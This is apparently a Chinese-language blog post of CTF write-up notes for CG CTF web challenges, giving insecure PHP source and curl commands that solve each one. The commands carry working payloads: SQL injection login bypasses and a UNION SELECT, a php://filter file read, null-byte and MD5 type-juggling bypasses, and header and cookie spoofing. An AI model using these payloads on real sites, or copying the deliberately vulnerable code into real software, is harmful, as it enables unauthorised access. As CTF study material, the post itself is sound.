---
layout: post
title:  "信息安全学习笔记 - CG CTF Web"
date:   2020-03-21 13:15:38 +0800
---

## 签到题

点开题目右键检查元素可以找到在a标签里面display属性为none的文本。

## [md5 collision](http://chinalover.sinaapp.com/web19/)

```php
# Source
$md51 = md5('QNKCDZO');
$a = @$_GET['a'];
$md52 = @md5($a);
if(isset($a)){
if ($a != 'QNKCDZO' && $md51 == $md52) {
    echo "nctf{*****************}";
} else {
    echo "false!!!";
}}
else{echo "please input a";}
```

```shell
echo -n QNKCDZO | md5sum
# 0e830400451993494058024219903391  -
```
巧合在于`QNKCDZO`的md5恰好是一个科学记数法表示的字符串而且值为0。使用`==`时，如果是这类字符串和一个数字比较，或者两个都是这类字符串，PHP会把这类字符串转换成浮点数。如果恰好输入参数a的md5值恰好也是一个科学记数法表示的0，那么验证的逻辑就会被绕过了。

```shell
curl http://chinalover.sinaapp.com/web19/?a=s214587387a
```

javascript里也存在类似的问题，区别在于如果两个都是字符串则不会转换

```javascript
0e111 == '0e12345'  // true
'0E111' == '0e12345' // false
```

### Notes
- `==` and float number format strings in php: [Why md5('240610708') is equal to md5('QNKCDZO')?](https://stackoverflow.com/questions/22140204)


## 签到2

需要修改输入框的maxlength。

## [这题不是WEB](http://chinalover.sinaapp.com/web2/index.html)

页面有个动图，保存下来之后用 `hexdump 2.gif -C`发现答案在尾部：

```
0000a330  b3 5b be c2 0a 16 b3 5f  5e c1 de 96 8e 19 08 00  |.[....._^.......|
0000a340  3b 6e 63 74 66 7b 70 68  6f 74 6f 5f 63 61 6e 5f  |;nctf{photo_can_|
0000a350  61 6c 73 6f 5f 68 69 64  33 5f 6d 73 67 7d 20 20  |also_hid3_msg}  |
0000a360  20 20 20 20 20 20 20 20  20 20 20 20 20 20        |              |
```
### Notes
- 原来图片可以藏信息，图片的展示也不会受到影响。


## [单身二十年](http://chinalover.sinaapp.com/web8/)

```shell
curl http://chinalover.sinaapp.com/web8/search_key.php
```

这个页面通过`window.location`让浏览器加载另一个url了，所以不能马上看到答案。

```html
<script>window.location="./no_key_is_here_forever.php"; </script>
key is : nctf{yougotit_script_now}
```

### Notes

- [`window.location`](https://developer.mozilla.org/en-US/docs/Web/API/Window/location)

## [单身一百年也没用](http://chinalover.sinaapp.com/web9/)

flag在响应的header里面，而且点击找key的连接会302。

## php decode
```php
# Source
<?php
function CLsI($ZzvSWE) {
 
    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));
 
    for ($i = 0; $i < strlen($ZzvSWE); $i++) {
 
        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);
 
    }
 
    return $ZzvSWE;
 
}
eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));
?>
```


貌似执行一下就可以了；解码之后的内容是`phpinfo();flag:nctf{...}`。暂时不清楚这段编码的作用。


## [文件包含](http://4.chinalover.sinaapp.com/web7/index.php)

包含当前页面，使用base64编码避免递归，然后可以再base64解码。

```shell
curl http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
```

### Notes

- php [filter](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter)


## [Cookie](http://chinalover.sinaapp.com/web10/index.php)

curl的结果中有个Set-Cookie: Login=0，server也许是通过这个Login的值判断有没有登录。这里的提示是cookie和session不一致。

```shell
curl http://chinalover.sinaapp.com/web10/index.php -v -H 'Cookie: Login=1'
```

## [MYSQL](http://chinalover.sinaapp.com/web11/)

提示是robots.txt，可以在robots.txt找到源代码

```shell
curl http://chinalover.sinaapp.com/web11/robots.txt
```

```php
# Source
<?php
if($_GET[id]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
  if ($_GET[id]==1024) {
      echo "<p>no! try again</p>";
  }
  else{
    echo($query[content]);
  }
}
?>
```
虽然把`id`的值转换为整数类型，但是在比较逻辑里又使用了原来的参数，所以这里可以输入一个浮点数绕过

```shell
curl http://chinalover.sinaapp.com/web11/sql.php?id=1024.1
```
### Notes

- robots.txt
- `intval` in php

## [/x00](http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php)

```php
# Source
if (isset ($_GET['nctf'])) {
    if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
        echo '必须输入数字才行';
    else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
        die('Flag: '.$flag);
    else
        echo '骚年，继续努力吧啊~';
}
```
题目有提示`\x00`
```shell
curl http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=12222%00%23biubiubiu
```
### Notes

- `ereg`: null byte is considered as the end of string
- [percent encoding](https://stackoverflow.com/a/5007362/8706476) in urls
  - null byte "\x00": `%00`
  - pound sign "#": `%23`
  - single quote "'": `%27`
  - right parenthesis ")": `%29`

## [bypass again](http://chinalover.sinaapp.com/web17/index.php)

```php
# Source
if (isset($_GET['a']) and isset($_GET['b'])) {
if ($_GET['a'] != $_GET['b'])
if (md5($_GET['a']) == md5($_GET['b']))
die('Flag: '.$flag);
else
print 'Wrong.';
}
```
前面的两个float number format string应该派上用场了。
```shell
curl 'http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&&b=s214587387a'
```

## [变量覆盖](http://chinalover.sinaapp.com/web18/index.php)

```html
<!-- Source -->
<?php if ($_SERVER["REQUEST_METHOD"] == "POST") { ?>
  <?php
  extract($_POST);
  if ($pass == $thepassword_123) { ?>
      <div class="alert alert-success">
          <code><?php echo $theflag; ?></code>
      </div>
  <?php } ?>
<?php } ?>
```

```shell
curl 'http://chinalover.sinaapp.com/web18/' -X POST -d 'pass=kke&thepassword_123=kke'
```

### Notes

- php `extract` imports variables into the current symbol table from an array

## [伪装者](http://chinalover.sinaapp.com/web4/xxx.php)

```html
<html>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

<pre><br><br><br><br>* * * * * * * * * * * * * * * * * * * * * * * * * *<br><br>         管理系统只能在本地登陆<br><br>           本系统外部禁止访问<br><br>* * * * * * * * * * * * * * * * * * * * * * * * * *<br></pre>不是本地登陆你还想要flag？
</html>
```

这里`X-Forwarded-For`不OK，要用`Client-Ip`:
```shell
curl http://chinalover.sinaapp.com/web4/xxx.php -v -H 'Client-Ip: 127.0.0.1'
```

## [SQL注入1](http://chinalover.sinaapp.com/index.php)

不看源代码试不出来

```php
# Source
if($_POST[user] && $_POST[pass]) {
    mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = trim($_POST[user]);
  $pass = md5(trim($_POST[pass]));
  $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')";
    echo '</br>'.$sql;
  $query = mysql_fetch_array(mysql_query($sql));
  if($query[user]=="admin") {
      echo "<p>Logged in! flag:******************** </p>";
  }
  if($query[user] != "admin") {
    echo("<p>You are not admin!</p>");
  }
}
echo $query[user];
```

```shell
curl http://chinalover.sinaapp.com/index.php -X POST -d 'user=admin%27%29+--+k&pass=Password'
```

### Notes

- [comments in MySQL](https://stackoverflow.com/a/14436098/8706476): `--` followed by space characters
  - append additional characters in case of `trim`

## [SQL注入2](http://4.chinalover.sinaapp.com/web6/index.php)

```php
# Source
if($_POST[user] && $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
      echo "<p>Logged in! Key: ntcf{**************} </p>";
  }
  else {
    echo("<p>Log in failure!</p>");
  }
}
```
让第一个字句返回结果为空，然后才能用上第二个字句的结果
```shell
curl http://4.chinalover.sinaapp.com/web6/index.php -X POST -d 'user=1%27+union+select+md5%28%2725252%27%29+--+m&pass=25252'
```

### Notes

- php [`mysql_fetch_array`](https://www.php.net/manual/en/function.mysql-fetch-array.php): Fetch **a** result row 


<!-- ## [file_get_contents](http://chinalover.sinaapp.com/web23/)

```shell
echo -n meizijiu > temp.txt

``` -->

## [变量覆盖](http://chinalover.sinaapp.com/web24/)

响应里面的注释有提示
```html
<!--foreach($_GET as $key => $value){  
        $$key = $value;  
}  
if($name == "meizijiu233"){
    echo $flag;
}-->
```

```shell
curl http://chinalover.sinaapp.com/web24/?name=meizijiu233
```

### Notes
- php [variable variable](https://www.php.net/manual/en/language.variables.variable.php)
